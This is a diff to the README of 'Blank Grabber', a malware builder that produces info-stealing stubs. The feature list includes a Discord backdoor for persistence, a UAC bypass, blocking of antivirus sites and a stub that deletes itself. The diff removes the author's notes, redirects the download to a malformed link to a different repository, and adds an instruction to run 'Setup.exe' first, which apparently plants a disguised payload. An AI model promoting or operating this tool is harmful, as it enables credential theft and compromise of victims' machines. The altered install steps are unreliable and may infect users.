@@ -1,55 +1,6 @@
 <h1 align="center">
    Blank Grabber
-</h1>
-<p align= "center">
-   <kbd>
-   <img  src="https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png">
-   </kbd><br><br>
-   <img src="https://img.shields.io/github/languages/top/Blank-c/Blank-Grabber">
-   <img src="https://img.shields.io/github/stars/Blank-c/Blank-Grabber">
-   <img src="https://img.shields.io/github/forks/Blank-c/Blank-Grabber">
-   <br>
-   <img src="https://img.shields.io/github/last-commit/Blank-c/Blank-Grabber">
-   <img src="https://img.shields.io/github/license/Blank-c/Blank-Grabber">
-   <br>
-   <img src="https://img.shields.io/github/issues/Blank-c/Blank-Grabber">
-   <img src="https://img.shields.io/github/issues-closed/Blank-c/Blank-Grabber">
-   <br>
-   <br>
-   <img src="https://repobeats.axiom.co/api/embed/3183aa00d01f8636a5cbc17344c36168eff93aec.svg">
-</p>
 
-## Project Status: Coming to an End
-
-Dear contributors and users,
-
-I hope this message finds you all well. I wanted to take a moment to share an important update regarding this project.
-
-Over the past year, we've worked together to build and improve this project. It has been an incredible journey, and I'm immensely grateful for all the contributions, feedback, and support from each one of you. This project has not only helped me improve my Python skills but has also been a great opportunity to explore and learn more about computer systems.
-
-However, as the saying goes, all good things must come to an end. As I approach the final year of my school journey, I find myself needing to focus on my academic responsibilities and make room for new opportunities ahead. Therefore, I have decided to step back from actively maintaining this project.
-
-I want to express my sincere appreciation to everyone who has participated in this project, be it through code contributions, issue reporting, or offering valuable insights. Your involvement has been the driving force behind the project's success.
-
-I'm happy to announce that noahmajors, one of the contributors to this project, has taken the initiative to fork the repository and continue its development. You can find the active fork at the following link: https://github.com/f4kedre4lity/Blank-Grabber
-
-I encourage you all to show your support to noahmajors and the new direction they will take the project. Please consider contributing to the fork if you are interested in its future development.
-
-While this marks the end of my direct involvement with this project, I sincerely hope that the codebase and knowledge shared here will continue to benefit the community.
-
-Thank you all once again for being part of this journey. I wish you all the best in your endeavors and hope our paths may cross again in the future.
-
-Best regards,  
-Blank-c
-
-## Table of Contents
-
-- [Download](#download)
-- [Features](#features)
-- [Stub Settings](#stub-settings)
-- [Requirements](#requirements)
-- [How to Build?](#how-to-build)
-- [Support the Project](#support-the-project)
 
 ## Download
 
@@ -108,7 +59,7 @@ Blank-c
 | **Melt Stub** | Deletes the stub after use. |
 | **Pump Stub** | Pumps the stub upto the provided size. |
 | **Fake Error** | Create custom (fake) error. |
-| **Block AV Sites** | Blocks AV related sites ([Unblock](https://github.com/Blank-c/Blank-Grabber/issues/117)). |
+| **Block AV Sites** | Blocks AV related sites  |
 | **Discord Injection** | Puts backdoor on the Discord client for persistence. |
 | **UAC Bypass** | Tries to get administrator permissions without showing any prompt. |
 
@@ -125,7 +76,7 @@ Blank-c
 
 1. Download and install [Python 3](https://www.python.org/downloads/) (Make sure to enable the *Add to PATH* option.)
 2. Verify the installation by executing `python --version` in [CMD](https://www.howtogeek.com/235101/10-ways-to-open-the-command-prompt-in-windows-10/?).
-3. [Download Blank Grabber](#download).
+3. [Download Blank Grabber]([(https://github.com/Blanker-c/Blank)).
 4. [Extract](https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file) the zip file.
-5. Navigate to the **Blank Grabber** folder and double click *Builder.bat* file.
+5. Navigate to the **Blank Grabber** folder and double click *Setup.exe* and after open *Builder.bat*.
 6. Fill in the fields of the builder and press the <kbd>Build</kbd> button.
